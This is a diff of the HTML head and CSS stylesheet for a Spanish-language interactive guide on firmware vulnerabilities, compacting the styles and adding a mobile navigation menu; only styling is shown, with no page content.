@@ -3,260 +3,220 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Guía Completa — Vulnerabilidades de Firmware</title>
-<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
+<title>Vulnerabilidades de Firmware</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
 <style>
-:root {
-  --bg: #0a0c10;
-  --bg2: #111318;
-  --bg3: #181c23;
-  --bg4: #1e2230;
-  --border: #1e2330;
-  --border2: #2a3040;
-  --text: #d0d5e0;
-  --text2: #8a93aa;
-  --text3: #444d60;
-  --accent: #00d4ff;
-  --red: #ff4455;
-  --red-bg: rgba(255,68,85,0.07);
-  --red-border: rgba(255,68,85,0.22);
-  --yellow: #ffaa00;
-  --yellow-bg: rgba(255,170,0,0.07);
-  --yellow-border: rgba(255,170,0,0.22);
-  --green: #00cc66;
-  --green-bg: rgba(0,204,102,0.07);
-  --green-border: rgba(0,204,102,0.22);
-  --purple: #b388ff;
-  --purple-bg: rgba(179,136,255,0.07);
-  --purple-border: rgba(179,136,255,0.22);
-  --mono: 'IBM Plex Mono', monospace;
-  --sans: 'IBM Plex Sans', sans-serif;
-}
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html { scroll-behavior: smooth; }
-body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.75; min-height: 100vh; }
+:root{--bg:#0a0c10;--bg2:#111318;--bg3:#181c23;--bg4:#1e2230;--bd:#1e2330;--bd2:#2a3040;--tx:#d0d5e0;--tx2:#8a93aa;--tx3:#444d60;--ac:#00d4ff;--red:#ff4455;--rb:rgba(255,68,85,.07);--rbr:rgba(255,68,85,.22);--yl:#ffaa00;--yb:rgba(255,170,0,.07);--ybr:rgba(255,170,0,.22);--gr:#00cc66;--gb:rgba(0,204,102,.07);--gbr:rgba(0,204,102,.22);--mono:'IBM Plex Mono',monospace;--sans:'IBM Plex Sans',sans-serif}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--tx);font-family:var(--sans);font-size:15px;line-height:1.75}
 
-header {
-  border-bottom: 1px solid var(--border);
-  padding: 0 2rem;
-  display: flex;
-  align-items: center;
-  gap: 1.25rem;
-  height: 54px;
-  position: sticky;
-  top: 0;
-  background: rgba(10,12,16,0.96);
-  backdrop-filter: blur(10px);
-  z-index: 200;
-}
-.h-tag { font-family: var(--mono); font-size: 10px; color: var(--accent); letter-spacing: .12em; background: rgba(0,212,255,0.08); border: 1px solid rgba(0,212,255,0.2); padding: 3px 8px; border-radius: 3px; white-space: nowrap; }
-header h1 { font-family: var(--mono); font-size: 12px; font-weight: 500; color: var(--text2); }
-.h-nav { margin-left: auto; display: flex; gap: 3px; flex-wrap: wrap; }
-.h-btn { font-family: var(--mono); font-size: 11px; padding: 5px 11px; border-radius: 4px; border: 1px solid transparent; background: transparent; color: var(--text2); cursor: pointer; transition: all .15s; white-space: nowrap; }
-.h-btn:hover { color: var(--text); background: var(--bg3); }
-.h-btn.active { color: var(--accent); border-color: rgba(0,212,255,0.25); background: rgba(0,212,255,0.06); }
+/* HEADER */
+header{border-bottom:1px solid var(--bd);padding:0 1.5rem;display:flex;align-items:center;gap:1rem;height:52px;position:sticky;top:0;background:rgba(10,12,16,.97);backdrop-filter:blur(10px);z-index:200;flex-wrap:nowrap}
+.h-tag{font-family:var(--mono);font-size:10px;color:var(--ac);letter-spacing:.1em;background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.2);padding:3px 8px;border-radius:3px;white-space:nowrap;flex-shrink:0}
+header h1{font-family:var(--mono);font-size:11px;color:var(--tx2);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1;min-width:0}
+.h-nav{margin-left:auto;display:flex;gap:2px;flex-shrink:0}
+.h-btn{font-family:var(--mono);font-size:11px;padding:5px 10px;border-radius:4px;border:1px solid transparent;background:transparent;color:var(--tx2);cursor:pointer;transition:all .15s;white-space:nowrap}
+.h-btn:hover{color:var(--tx);background:var(--bg3)}
+.h-btn.active{color:var(--ac);border-color:rgba(0,212,255,.25);background:rgba(0,212,255,.06)}
 
-.wrap { max-width: 860px; margin: 0 auto; padding: 2.5rem 1.75rem 5rem; }
-.section { display: none; }
-.section.active { display: block; }
+/* HAMBURGER (mobile) */
+.menu-toggle{display:none;background:none;border:1px solid var(--bd2);color:var(--tx2);font-size:18px;padding:4px 8px;border-radius:4px;cursor:pointer;flex-shrink:0}
+.mobile-nav{display:none;position:fixed;top:52px;left:0;right:0;background:rgba(10,12,16,.98);border-bottom:1px solid var(--bd);padding:1rem;z-index:199;gap:6px;flex-direction:column}
+.mobile-nav.open{display:flex}
+.mobile-nav .h-btn{text-align:left;width:100%;padding:8px 12px}
 
-.s-num { font-family: var(--mono); font-size: 10px; color: var(--accent); letter-spacing: .12em; margin-bottom: .35rem; }
-.s-title { font-family: var(--mono); font-size: 24px; font-weight: 600; color: #fff; line-height: 1.15; margin-bottom: .6rem; }
-.s-lead { font-size: 15px; color: var(--text2); line-height: 1.7; max-width: 700px; margin-bottom: 2rem; }
+/* LAYOUT */
+.wrap{max-width:840px;margin:0 auto;padding:2rem 1.25rem 5rem}
+.section{display:none}.section.active{display:block}
 
-h3 { font-family: var(--mono); font-size: 12px; font-weight: 600; color: var(--accent); letter-spacing: .08em; margin: 2rem 0 .75rem; text-transform: uppercase; }
-h4 { font-size: 15px; font-weight: 600; color: var(--text); margin: 1.25rem 0 .5rem; }
-p { color: var(--text2); margin-bottom: .85rem; }
-p:last-child { margin-bottom: 0; }
-strong { color: var(--text); font-weight: 600; }
-em { color: var(--yellow); font-style: italic; }
+/* TYPOGRAPHY */
+.s-num{font-family:var(--mono);font-size:10px;color:var(--ac);letter-spacing:.12em;margin-bottom:.3rem}
+.s-title{font-family:var(--mono);font-size:22px;font-weight:600;color:#fff;line-height:1.2;margin-bottom:.5rem}
+.s-lead{font-size:14px;color:var(--tx2);line-height:1.7;max-width:680px;margin-bottom:1.75rem}
+h3{font-family:var(--mono);font-size:11px;font-weight:600;color:var(--ac);letter-spacing:.08em;margin:1.75rem 0 .65rem;text-transform:uppercase}
+h4{font-size:14px;font-weight:600;color:var(--tx);margin:1rem 0 .4rem}
+p{color:var(--tx2);margin-bottom:.75rem}
+p:last-child{margin-bottom:0}
+strong{color:var(--tx);font-weight:600}
+em{color:var(--yl);font-style:italic}
+hr{border:none;border-top:1px solid var(--bd);margin:1.75rem 0}
 
-.card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 1.35rem 1.6rem; margin-bottom: 1rem; transition: border-color .2s; }
-.card:hover { border-color: var(--border2); }
-.card-label { font-family: var(--mono); font-size: 10px; font-weight: 600; color: var(--accent); letter-spacing: .1em; margin-bottom: .6rem; text-transform: uppercase; }
-.card p { font-size: 14px; }
-.card.red { border-color: var(--red-border); background: var(--red-bg); }
-.card.yellow { border-color: var(--yellow-border); background: var(--yellow-bg); }
-.card.green { border-color: var(--green-border); background: var(--green-bg); }
-.card.accent { border-color: rgba(0,212,255,0.2); background: rgba(0,212,255,0.05); }
+/* CARDS */
+.card{background:var(--bg2);border:1px solid var(--bd);border-radius:8px;padding:1.1rem 1.35rem;margin-bottom:.85rem;transition:border-color .2s}
+.card:hover{border-color:var(--bd2)}
+.card-label{font-family:var(--mono);font-size:10px;font-weight:600;color:var(--ac);letter-spacing:.1em;margin-bottom:.5rem;text-transform:uppercase}
+.card p{font-size:14px}
+.card.red{border-color:var(--rbr);background:var(--rb)}
+.card.yellow{border-color:var(--ybr);background:var(--yb)}
+.card.green{border-color:var(--gbr);background:var(--gb)}
+.card.accent{border-color:rgba(0,212,255,.2);background:rgba(0,212,255,.05)}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:.85rem}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:.85rem}
 
-.g2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
-.g3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 1rem; }
+/* BADGES */
+.badge{display:inline-block;font-family:var(--mono);font-size:10px;letter-spacing:.05em;font-weight:600;padding:2px 6px;border-radius:3px;vertical-align:middle;margin:1px 2px}
+.b-red{background:var(--rb);color:var(--red);border:1px solid var(--rbr)}
+.b-yellow{background:var(--yb);color:var(--yl);border:1px solid var(--ybr)}
+.b-green{background:var(--gb);color:var(--gr);border:1px solid var(--gbr)}
+.b-blue{background:rgba(0,212,255,.07);color:var(--ac);border:1px solid rgba(0,212,255,.2)}
 
-.badge { display: inline-block; font-family: var(--mono); font-size: 10px; letter-spacing: .05em; font-weight: 600; padding: 2px 7px; border-radius: 3px; vertical-align: middle; margin: 1px 2px; }
-.b-red { background: var(--red-bg); color: var(--red); border: 1px solid var(--red-border); }
-.b-yellow { background: var(--yellow-bg); color: var(--yellow); border: 1px solid var(--yellow-border); }
-.b-green { background: var(--green-bg); color: var(--green); border: 1px solid var(--green-border); }
-.b-blue { background: rgba(0,212,255,0.07); color: var(--accent); border: 1px solid rgba(0,212,255,0.2); }
+/* CALLOUTS */
+.analogy{border-left:3px solid var(--yl);background:var(--yb);border-radius:0 7px 7px 0;padding:.9rem 1.1rem;margin:1rem 0}
+.analogy-label{font-family:var(--mono);font-size:10px;color:var(--yl);letter-spacing:.1em;font-weight:600;margin-bottom:.35rem}
+.analogy p{font-size:13px;color:#ccaa66}
+.important{border-left:3px solid var(--red);background:var(--rb);border-radius:0 7px 7px 0;padding:.9rem 1.1rem;margin:1rem 0}
+.important-label{font-family:var(--mono);font-size:10px;color:var(--red);letter-spacing:.1em;font-weight:600;margin-bottom:.35rem}
+.important p{font-size:13px;color:#cc8888}
+.note{border-left:3px solid var(--ac);background:rgba(0,212,255,.05);border-radius:0 7px 7px 0;padding:.9rem 1.1rem;margin:1rem 0}
+.note-label{font-family:var(--mono);font-size:10px;color:var(--ac);letter-spacing:.1em;font-weight:600;margin-bottom:.35rem}
+.note p{font-size:13px;color:var(--tx2)}
 
-.analogy { border-left: 3px solid var(--yellow); background: var(--yellow-bg); border-radius: 0 8px 8px 0; padding: 1rem 1.25rem; margin: 1.25rem 0; }
-.analogy-label { font-family: var(--mono); font-size: 10px; color: var(--yellow); letter-spacing: .1em; font-weight: 600; margin-bottom: .4rem; }
-.analogy p { font-size: 14px; color: #ccaa66; }
+/* STAT BLOCK */
+.stat-block{border:1px solid var(--rbr);border-radius:8px;background:var(--rb);padding:1.25rem 1.5rem;display:flex;align-items:center;gap:1.25rem;margin:1.25rem 0}
+.stat-num{font-family:var(--mono);font-size:44px;font-weight:600;color:var(--red);line-height:1;flex-shrink:0}
+.stat-text{font-size:13px;color:var(--tx2);line-height:1.6}
 
-.important { border-left: 3px solid var(--red); background: var(--red-bg); border-radius: 0 8px 8px 0; padding: 1rem 1.25rem; margin: 1.25rem 0; }
-.important-label { font-family: var(--mono); font-size: 10px; color: var(--red); letter-spacing: .1em; font-weight: 600; margin-bottom: .4rem; }
-.important p { font-size: 14px; color: #cc8888; }
-
-.note { border-left: 3px solid var(--accent); background: rgba(0,212,255,0.05); border-radius: 0 8px 8px 0; padding: 1rem 1.25rem; margin: 1.25rem 0; }
-.note-label { font-family: var(--mono); font-size: 10px; color: var(--accent); letter-spacing: .1em; font-weight: 600; margin-bottom: .4rem; }
-.note p { font-size: 14px; color: var(--text2); }
-
-.stat-block { border: 1px solid var(--red-border); border-radius: 10px; background: var(--red-bg); padding: 1.5rem 1.75rem; display: flex; align-items: center; gap: 1.5rem; margin: 1.5rem 0; }
-.stat-num { font-family: var(--mono); font-size: 52px; font-weight: 600; color: var(--red); line-height: 1; flex-shrink: 0; }
-.stat-text { font-size: 14px; color: var(--text2); line-height: 1.65; }
-
-.code { background: #060810; border: 1px solid var(--border); border-radius: 7px; padding: 1rem 1.25rem; font-family: var(--mono); font-size: 12px; color: #7a8299; line-height: 1.85; margin: .85rem 0; overflow-x: auto; white-space: pre; }
-.code .k { color: #ff79c6; }
-.code .s { color: #f1fa8c; }
-.code .c { color: #3a4255; font-style: italic; }
-.code .hl { color: var(--red); font-weight: 600; }
-.code .ok { color: var(--green); }
-.code .w { color: var(--yellow); }
-.code .acc { color: var(--accent); }
-
-hr { border: none; border-top: 1px solid var(--border); margin: 2rem 0; }
+/* CODE */
+.code{background:#060810;border:1px solid var(--bd);border-radius:6px;padding:.9rem 1.1rem;font-family:var(--mono);font-size:11px;color:#7a8299;line-height:1.8;margin:.75rem 0;overflow-x:auto;white-space:pre}
+.code .k{color:#ff79c6}.code .s{color:#f1fa8c}.code .c{color:#3a4255;font-style:italic}
+.code .hl{color:var(--red);font-weight:600}.code .ok{color:var(--gr)}.code .w{color:var(--yl)}.code .acc{color:var(--ac)}
 
 /* LAYER STACK */
-.layer-stack { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; overflow: hidden; margin: 1.5rem 0; }
-.layer-stack-header { background: var(--bg3); border-bottom: 1px solid var(--border); padding: .7rem 1.25rem; font-family: var(--mono); font-size: 11px; color: var(--text2); display: flex; align-items: center; gap: 8px; }
-.dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
-.layers-wrap { padding: 1.25rem; display: flex; flex-direction: column; gap: 6px; }
-.layer { border-radius: 6px; padding: .75rem 1.1rem; font-family: var(--mono); font-size: 12px; display: flex; align-items: flex-start; justify-content: space-between; gap: 1rem; border: 1px solid transparent; cursor: pointer; transition: all .2s; }
-.layer-info { flex: 1; }
-.layer-name { font-weight: 600; margin-bottom: 2px; }
-.layer-desc { font-size: 11px; opacity: .65; font-family: var(--sans); font-weight: 400; line-height: 1.4; }
-.layer-tag { font-size: 10px; white-space: nowrap; flex-shrink: 0; }
-.layer.l-app { background: rgba(30,34,48,.7); border-color: var(--border2); color: var(--text2); }
-.layer.l-app:hover { background: rgba(40,46,66,.9); }
-.layer.l-net { background: rgba(0,212,255,.05); border-color: rgba(0,212,255,.15); color: #7ac7d4; }
-.layer.l-net:hover { background: rgba(0,212,255,.1); }
-.layer.l-fw { background: rgba(255,68,85,.1); border-color: var(--red-border); color: #dd8888; }
-.layer.l-fw:hover { background: rgba(255,68,85,.15); }
-.layer.l-hw { background: rgba(20,22,32,.9); border-color: var(--border); color: var(--text3); }
-.layer-detail { display: none; background: var(--bg3); border-top: 1px solid var(--border); padding: 1rem 1.25rem; font-size: 13px; color: var(--text2); line-height: 1.7; }
-.layer-detail.open { display: block; }
-.layer-detail h5 { font-family: var(--mono); font-size: 11px; color: var(--accent); margin-bottom: .5rem; letter-spacing: .06em; }
-.layer-detail h5:not(:first-child) { margin-top: .85rem; }
-.layer-detail ul { padding-left: 1.2rem; }
-.layer-detail li { margin-bottom: .3rem; }
+.layer-stack{background:var(--bg2);border:1px solid var(--bd);border-radius:8px;overflow:hidden;margin:1.25rem 0}
+.layer-stack-header{background:var(--bg3);border-bottom:1px solid var(--bd);padding:.6rem 1.1rem;font-family:var(--mono);font-size:11px;color:var(--tx2);display:flex;align-items:center;gap:7px}
+.dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.layers-wrap{padding:1rem;display:flex;flex-direction:column;gap:5px}
+.layer{border-radius:5px;padding:.65rem 1rem;font-family:var(--mono);font-size:12px;display:flex;align-items:flex-start;justify-content:space-between;gap:1rem;border:1px solid transparent;cursor:pointer;transition:all .2s}
+.layer-name{font-weight:600;margin-bottom:2px}.layer-desc{font-size:11px;opacity:.65;font-family:var(--sans);line-height:1.35}
+.layer-tag{font-size:10px;white-space:nowrap;flex-shrink:0}
+.layer.l-app{background:rgba(30,34,48,.7);border-color:var(--bd2);color:var(--tx2)}.layer.l-app:hover{background:rgba(40,46,66,.9)}
+.layer.l-net{background:rgba(0,212,255,.05);border-color:rgba(0,212,255,.15);color:#7ac7d4}.layer.l-net:hover{background:rgba(0,212,255,.1)}
+.layer.l-fw{background:rgba(255,68,85,.1);border-color:var(--rbr);color:#dd8888}.layer.l-fw:hover{background:rgba(255,68,85,.15)}
+.layer.l-hw{background:rgba(20,22,32,.9);border-color:var(--bd);color:var(--tx3)}
+.layer-detail{display:none;background:var(--bg3);border-top:1px solid var(--bd);padding:.9rem 1.1rem;font-size:13px;color:var(--tx2);line-height:1.65}
+.layer-detail.open{display:block}
+.layer-detail h5{font-family:var(--mono);font-size:10px;color:var(--ac);margin-bottom:.4rem;letter-spacing:.06em}
+.layer-detail h5:not(:first-child){margin-top:.75rem}
+.layer-detail ul{padding-left:1.1rem}.layer-detail li{margin-bottom:.25rem}
 
-/* VULN TABS */
-.vtabs { display: flex; gap: 0; border: 1px solid var(--border); border-radius: 7px; overflow: hidden; margin-bottom: 1.5rem; }
-.vtab { flex: 1; font-family: var(--mono); font-size: 12px; padding: 10px 8px; background: transparent; border: none; border-right: 1px solid var(--border); color: var(--text2); cursor: pointer; transition: all .15s; text-align: center; }
-.vtab:last-child { border-right: none; }
-.vtab:hover { background: var(--bg3); color: var(--text); }
-.vtab.active { background: var(--bg3); color: var(--accent); }
-.vpanel { display: none; }
-.vpanel.active { display: block; }
+/* VTABS */
+.vtabs{display:flex;border:1px solid var(--bd);border-radius:6px;overflow:hidden;margin-bottom:1.25rem;flex-wrap:wrap}
+.vtab{flex:1;font-family:var(--mono);font-size:11px;padding:9px 6px;background:transparent;border:none;border-right:1px solid var(--bd);color:var(--tx2);cursor:pointer;transition:all .15s;text-align:center;min-width:0}
+.vtab:last-child{border-right:none}
+.vtab:hover{background:var(--bg3);color:var(--tx)}
+.vtab.active{background:var(--bg3);color:var(--ac)}
+.vpanel{display:none}.vpanel.active{display:block}
 
 /* STEPS */
-.steps { counter-reset: st; margin: 1rem 0; }
-.step { counter-increment: st; display: flex; gap: 1rem; margin-bottom: 1.5rem; align-items: flex-start; }
-.step::before { content: counter(st); font-family: var(--mono); font-size: 11px; font-weight: 600; color: var(--accent); background: rgba(0,212,255,.08); border: 1px solid rgba(0,212,255,.2); border-radius: 5px; min-width: 28px; height: 28px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; margin-top: 2px; }
-.step-body { flex: 1; }
-.step-body h4 { margin-top: 0; margin-bottom: .4rem; }
-.step-body p { font-size: 14px; }
+.steps{counter-reset:st;margin:.85rem 0}
+.step{counter-increment:st;display:flex;gap:.85rem;margin-bottom:1.25rem;align-items:flex-start}
+.step::before{content:counter(st);font-family:var(--mono);font-size:11px;font-weight:600;color:var(--ac);background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.2);border-radius:5px;min-width:26px;height:26px;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}
+.step-body{flex:1}.step-body h4{margin-top:0;margin-bottom:.35rem}.step-body p{font-size:13px}
 
-/* MEMORY */
-.mem-wrap { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 1.25rem; margin: 1rem 0; }
-.mem-title { font-family: var(--mono); font-size: 11px; color: var(--text2); margin-bottom: .75rem; }
-.mem-legend { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: .75rem; }
-.mem-legend span { font-size: 11px; color: var(--text2); display: flex; align-items: center; gap: 5px; }
-.ldot { width: 10px; height: 10px; border-radius: 2px; flex-shrink: 0; }
-.ldot-n  { background: var(--bg3); border: 1px solid var(--border2); }
-.ldot-d  { background: rgba(0,212,255,.25); border: 1px solid rgba(0,212,255,.4); }
-.ldot-ov { background: rgba(255,68,85,.3);  border: 1px solid rgba(255,68,85,.4); }
-.ldot-r  { background: rgba(255,170,0,.25); border: 1px solid rgba(255,170,0,.4); }
-.ldot-sh { background: rgba(0,204,102,.25); border: 1px solid rgba(0,204,102,.4); }
-.mem-grid { display: grid; grid-template-columns: repeat(16,1fr); gap: 3px; }
-.mc { height: 28px; border-radius: 3px; background: var(--bg3); border: 1px solid var(--border); font-family: var(--mono); font-size: 8px; display: flex; align-items: center; justify-content: center; color: var(--text3); transition: all .35s; }
-.mc.d   { background: rgba(0,212,255,.12); border-color: rgba(0,212,255,.35); color: var(--accent); }
-.mc.ov  { background: rgba(255,68,85,.2);  border-color: rgba(255,68,85,.4);  color: var(--red); animation: blinkR 1s ease-in-out infinite alternate; }
-.mc.ret { background: rgba(255,170,0,.15); border-color: rgba(255,170,0,.4);  color: var(--yellow); }
-.mc.sh  { background: rgba(0,204,102,.2);  border-color: rgba(0,204,102,.4);  color: var(--green); animation: blinkG 1s ease-in-out infinite alternate; }
-@keyframes blinkR { from{opacity:.5} to{opacity:1} }
-@keyframes blinkG { from{opacity:.5} to{opacity:1} }
-.mem-btns { display: flex; gap: 6px; margin-top: .85rem; flex-wrap: wrap; }
-.mbtn { font-family: var(--mono); font-size: 11px; padding: 5px 12px; border-radius: 5px; border: 1px solid var(--border2); background: transparent; color: var(--text2); cursor: pointer; transition: all .15s; }
-.mbtn:hover { background: var(--bg3); color: var(--text); }
-.mbtn.danger { border-color: var(--red-border); color: var(--red); }
-.mbtn.danger:hover { background: var(--red-bg); }
-.mem-msg { font-size: 13px; color: var(--text2); margin-top: .75rem; min-height: 44px; line-height: 1.6; padding: .65rem .9rem; background: var(--bg3); border-radius: 5px; border: 1px solid var(--border); }
+/* MEMORY VISUALIZER */
+.mem-wrap{background:var(--bg2);border:1px solid var(--bd);border-radius:8px;padding:1.1rem;margin:.85rem 0}
+.mem-title{font-family:var(--mono);font-size:11px;color:var(--tx2);margin-bottom:.65rem}
+.mem-legend{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:.65rem}
+.mem-legend span{font-size:11px;color:var(--tx2);display:flex;align-items:center;gap:4px}
+.ldot{width:9px;height:9px;border-radius:2px;flex-shrink:0}
+.ldot-n{background:var(--bg3);border:1px solid var(--bd2)}.ldot-d{background:rgba(0,212,255,.25);border:1px solid rgba(0,212,255,.4)}
+.ldot-ov{background:rgba(255,68,85,.3);border:1px solid rgba(255,68,85,.4)}.ldot-r{background:rgba(255,170,0,.25);border:1px solid rgba(255,170,0,.4)}
+.ldot-sh{background:rgba(0,204,102,.25);border:1px solid rgba(0,204,102,.4)}
+.mem-grid{display:grid;grid-template-columns:repeat(16,1fr);gap:3px}
+.mc{height:26px;border-radius:3px;background:var(--bg3);border:1px solid var(--bd);font-family:var(--mono);font-size:8px;display:flex;align-items:center;justify-content:center;color:var(--tx3);transition:all .3s}
+.mc.d{background:rgba(0,212,255,.12);border-color:rgba(0,212,255,.35);color:var(--ac)}
+.mc.ov{background:rgba(255,68,85,.2);border-color:rgba(255,68,85,.4);color:var(--red);animation:blinkR 1s ease-in-out infinite alternate}
+.mc.ret{background:rgba(255,170,0,.15);border-color:rgba(255,170,0,.4);color:var(--yl)}
+.mc.sh{background:rgba(0,204,102,.2);border-color:rgba(0,204,102,.4);color:var(--gr);animation:blinkG 1s ease-in-out infinite alternate}
+@keyframes blinkR{from{opacity:.5}to{opacity:1}}@keyframes blinkG{from{opacity:.5}to{opacity:1}}
+.mem-btns{display:flex;gap:5px;margin-top:.75rem;flex-wrap:wrap}
+.mbtn{font-family:var(--mono);font-size:11px;padding:5px 11px;border-radius:5px;border:1px solid var(--bd2);background:transparent;color:var(--tx2);cursor:pointer;transition:all .15s}
+.mbtn:hover{background:var(--bg3);color:var(--tx)}.mbtn.danger{border-color:var(--rbr);color:var(--red)}.mbtn.danger:hover{background:var(--rb)}
+.mem-msg{font-size:12px;color:var(--tx2);margin-top:.65rem;min-height:40px;line-height:1.6;padding:.6rem .85rem;background:var(--bg3);border-radius:5px;border:1px solid var(--bd)}
 
-/* PROTECTION ROWS */
-.prot-row { display: flex; align-items: flex-start; justify-content: space-between; gap: 1rem; padding: 1.1rem 0; border-bottom: 1px solid var(--border); }
-.prot-row:last-child { border-bottom: none; }
-.prot-left { flex: 1; }
-.prot-name { font-family: var(--mono); font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: .2rem; }
-.prot-full { font-size: 12px; color: var(--text2); margin-bottom: .5rem; }
-.prot-exp { font-size: 13px; color: var(--text2); line-height: 1.65; }
-.prot-badges { display: flex; flex-direction: column; gap: 4px; align-items: flex-end; flex-shrink: 0; }
+/* PROTECTIONS */
+.prot-row{display:flex;align-items:flex-start;justify-content:space-between;gap:1rem;padding:1rem 0;border-bottom:1px solid var(--bd)}
+.prot-row:last-child{border-bottom:none}
+.prot-name{font-family:var(--mono);font-size:13px;font-weight:600;color:var(--tx);margin-bottom:.15rem}
+.prot-full{font-size:12px;color:var(--tx2);margin-bottom:.4rem}
+.prot-exp{font-size:13px;color:var(--tx2);line-height:1.6}
+.prot-badges{display:flex;flex-direction:column;gap:3px;align-items:flex-end;flex-shrink:0}
 
 /* TIMELINE */
-.timeline { position: relative; padding-left: 2.25rem; }
-.timeline::before { content: ''; position: absolute; left: 8px; top: 0; bottom: 0; width: 1px; background: var(--border2); }
-.tl-item { position: relative; margin-bottom: 0; }
-.tl-dot { position: absolute; left: -2.25rem; top: 1.4rem; width: 16px; height: 16px; border-radius: 50%; background: var(--bg2); border: 2px solid var(--border2); transition: all .2s; z-index: 1; }
-.tl-item:hover .tl-dot, .tl-item.open .tl-dot { transform: scale(1.25); }
-.tl-item.p-danger .tl-dot { border-color: var(--red); }
-.tl-item.p-danger:hover .tl-dot, .tl-item.p-danger.open .tl-dot { background: var(--red-bg); box-shadow: 0 0 0 3px rgba(255,68,85,.15); }
-.tl-item.p-warn .tl-dot { border-color: var(--yellow); }
-.tl-item.p-warn:hover .tl-dot, .tl-item.p-warn.open .tl-dot { background: var(--yellow-bg); }
-.tl-item.p-ok .tl-dot { border-color: var(--green); }
-.tl-item.p-ok:hover .tl-dot, .tl-item.p-ok.open .tl-dot { background: var(--green-bg); }
-.tl-item.p-neutral:hover .tl-dot, .tl-item.p-neutral.open .tl-dot { border-color: var(--accent); background: rgba(0,212,255,.1); }
-.tl-trigger { padding: 1.1rem 0 .3rem; border: none; background: none; width: 100%; text-align: left; cursor: pointer; color: inherit; }
-.tl-phase { font-family: var(--mono); font-size: 10px; letter-spacing: .1em; color: var(--text2); margin-bottom: .2rem; }
-.tl-name { font-family: var(--mono); font-size: 15px; font-weight: 600; color: var(--text); }
-.tl-hint { font-size: 12px; color: var(--text3); font-family: var(--sans); font-weight: 400; display: block; margin-top: 2px; }
-.tl-item:hover .tl-hint { color: var(--text2); }
-.tl-body { max-height: 0; overflow: hidden; transition: max-height .4s ease, opacity .3s; opacity: 0; }
-.tl-item.open .tl-body { max-height: 1200px; opacity: 1; padding-bottom: 1.25rem; }
+.timeline{position:relative;padding-left:2.1rem}
+.timeline::before{content:'';position:absolute;left:7px;top:0;bottom:0;width:1px;background:var(--bd2)}
+.tl-item{position:relative;margin-bottom:0}
+.tl-dot{position:absolute;left:-2.1rem;top:1.3rem;width:14px;height:14px;border-radius:50%;background:var(--bg2);border:2px solid var(--bd2);transition:all .2s;z-index:1}
+.tl-item.p-danger .tl-dot{border-color:var(--red)}
+.tl-item.p-danger.open .tl-dot{background:var(--rb);box-shadow:0 0 0 3px rgba(255,68,85,.15)}
+.tl-item.p-warn .tl-dot{border-color:var(--yl)}.tl-item.p-warn.open .tl-dot{background:var(--yb)}
+.tl-item.p-ok .tl-dot{border-color:var(--gr)}.tl-item.p-ok.open .tl-dot{background:var(--gb)}
+.tl-item.p-neutral.open .tl-dot{border-color:var(--ac);background:rgba(0,212,255,.1)}
+.tl-trigger{padding:.95rem 0 .25rem;border:none;background:none;width:100%;text-align:left;cursor:pointer;color:inherit}
+.tl-phase{font-family:var(--mono);font-size:10px;letter-spacing:.1em;color:var(--tx2);margin-bottom:.15rem}
+.tl-name{font-family:var(--mono);font-size:14px;font-weight:600;color:var(--tx)}
+.tl-hint{font-size:11px;color:var(--tx3);font-family:var(--sans);display:block;margin-top:2px}
+.tl-body{max-height:0;overflow:hidden;transition:max-height .4s ease,opacity .3s;opacity:0}
+.tl-item.open .tl-body{max-height:1500px;opacity:1;padding-bottom:1.1rem}
 
 /* TABLE */
-.stbl { width: 100%; border-collapse: collapse; font-size: 13px; margin-top: 1.5rem; }
-.stbl th { text-align: left; font-family: var(--mono); font-size: 10px; letter-spacing: .08em; color: var(--text2); font-weight: 500; padding: .5rem .75rem; border-bottom: 1px solid var(--border2); }
-.stbl td { padding: .7rem .75rem; border-bottom: 1px solid var(--border); color: var(--text2); line-height: 1.5; }
-.stbl tr:last-child td { border-bottom: none; }
-.stbl td:first-child { font-family: var(--mono); font-size: 12px; color: var(--text); white-space: nowrap; }
+.stbl{width:100%;border-collapse:collapse;font-size:12px;margin-top:1.25rem}
+.stbl th{text-align:left;font-family:var(--mono);font-size:10px;letter-spacing:.07em;color:var(--tx2);font-weight:500;padding:.4rem .65rem;border-bottom:1px solid var(--bd2)}
+.stbl td{padding:.6rem .65rem;border-bottom:1px solid var(--bd);color:var(--tx2);line-height:1.45}
+.stbl tr:last-child td{border-bottom:none}
+.stbl td:first-child{font-family:var(--mono);font-size:11px;color:var(--tx);white-space:nowrap}
 
 /* BARS */
-.bar-row { margin-bottom: .8rem; }
-.bar-meta { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
-.bar-name { font-size: 13px; color: var(--text2); }
-.bar-val { font-family: var(--mono); font-size: 12px; color: var(--text2); }
-.bar-track { height: 7px; background: var(--bg3); border-radius: 4px; overflow: hidden; border: 1px solid var(--border); }
-.bar-fill { height: 100%; border-radius: 4px; }
-.bf-ok { background: var(--green); }
-.bf-warn { background: var(--yellow); }
-.bf-danger { background: var(--red); }
+.bar-row{margin-bottom:.65rem}
